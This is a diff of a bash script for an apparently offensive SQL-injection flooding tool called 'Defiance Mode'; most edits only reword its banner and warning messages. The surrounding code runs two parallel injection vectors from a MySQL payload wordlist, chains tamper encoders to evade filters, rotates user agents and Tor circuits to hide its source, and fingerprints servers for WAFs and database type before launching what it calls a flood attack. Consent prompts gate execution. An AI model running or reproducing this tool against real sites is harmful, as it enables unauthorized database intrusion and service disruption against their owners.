@@ -46,14 +46,13 @@ print_defiance_logo() {
     echo -e "            \e[38;5;18m▀██\e[38;5;21m█▄\e[0m"
     echo -e "              \e[38;5;18m▀██\e[0m"
     echo -e "                \e[38;5;18m▀\e[0m"
-    echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m WARNING: UNLEASHING DEFIANCE SYSTEM CONFRONTATION."
+    echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Defiance mode active, no no friendly now."
     if [ -n "$custom_proxy" ]; then
-        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m Custom Proxy Interface Engaged: Routing via $custom_proxy"
+        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m Custom proxy: $custom_proxy enables"
     else
-        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m Multi-Circuit Rotation Enabled. IPs are shifting dynamically per request!"
+        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m Multi Circuit Rotation Enabled. IPs are shifting dynamically per request!"
     fi
 }
-
 vector_sqli_agressor_left() {
     local agressor_ua="Mozilla/5.0 (Linux; Android 10; Termux_Agresor_L1)"
 
@@ -64,7 +63,6 @@ vector_sqli_agressor_left() {
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
 
-        # === KOMBO 6 TAMPER INTEGRASI TOTAL DARI HUNGRY.SH ===
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
@@ -96,7 +94,6 @@ vector_sqli_agressor_right() {
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
 
-        # === KOMBO 6 TAMPER INTEGRASI TOTAL DARI HUNGRY.SH ===
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
@@ -118,21 +115,20 @@ vector_sqli_agressor_right() {
     done < "$WORDLIST_MYSQL"
 }
 
-# MAIN EXECUTION CONTROL
 clear
 print_defiance_logo
 
-echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING LEVEL 1:\e[0m Defiance Mode fires a multi-vector parallel network flood."
+echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 1/2:\e[0m Defiance Mode fires a multi-vector parallel network flood."
 echo -e "    Executing this mode against unauthorized infrastructures strictly violates cyber laws."
 echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Do you have explicit written consent from the target owner? (YES/no): "
 read -r legal_1
 
 if [ "$legal_1" != "YES" ]; then
-    echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Execution aborted. Unauthorized scanning is strictly illegal. Be safe, dawg!"
+    echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Execution aborted. Unauthorized scanning is strictly illegal."
     exit 1
 fi
 
-echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING LEVEL 2:\e[0m This tool is NOT server-friendly in Defiance Mode."
+echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server-friendly in Defiance Mode."
 echo -e "    This action will trigger heavy CPU calculation loads and dynamic Multi-IP routing on the target."
 echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Type \e[1;33m'I ACCEPT ALL RISKS'\e[0m to proceed with the execution sequence: "
 read -r legal_2
@@ -147,33 +143,33 @@ if [ -z "$custom_proxy" ]; then
     if pgrep -x "tor" >/dev/null 2>&1; then
         echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Tor terminal service detected as active (Multi-Circuit Ready)."
     else
-        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: Tor terminal service is not detected/running."
+        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Tor terminal service is not detected/running."
         echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
         echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Operation aborted due to environment mismatch."
         exit 1
     fi
 fi
 
-echo -e "\n\e[0;32m[\e[0m+\e[0;37m]\e[0m Double legal verification passed. Pre-Scan targeting engine engaged."
+echo -e "\n\e[0;32m[\e[0m+\e[0;37m]\e[0m Double legal verification passed. Pre Scan targeting engine engaged."
 sleep 1
 
-echo -e "\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing strict database environment verification..."
+echo -e "\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing database environment verification."
 recon_port=${TOR_CIRCUITS}
 if [ -n "$custom_proxy" ]; then recon_proxy="-x $recon_port"; else recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"; fi
 
 server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
 
 if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
-    echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m DEFIANCE TARGET REJECTED: Non-MySQL environment fingerprint detected!"
+    echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Target rejected, Non MySQL environment fingerprint detected."
     echo -e "    Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
-    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Reverting to safety. Defiance Mode stands down to prevent structural asset wastage."
+    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Defiance Mode stands down to prevent structural asset wastage."
     exit 1
 else
-    echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Validation passed: Target environment matches MySQL compliance directives."
+    echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Target environment matches MySQL compliance directives."
 fi
 sleep 1
 
-echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Launching dual-vector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
+echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
 
 vector_sqli_agressor_left &
 pid_vector1=$!
@@ -183,14 +179,11 @@ pid_vector2=$!
 
 wait $pid_vector1 $pid_vector2
 
-echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Activating Defiance Log Analyst..."
+echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Inputing the Defiance Log Analyst."
 sleep 1
 
 if [ -f "$DEFIANCE_DIR/validators/defval.py" ]; then
     python "$DEFIANCE_DIR/validators/defval.py"
 else
-    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: validators/defval.py not found. Skipping live analysis."
+    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m validators/defval.py not found. Skipping live analysis."
 fi
-
-echo ""
-echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Ending Defiance Sequence. ImCurvin' Version: 1.2.0."
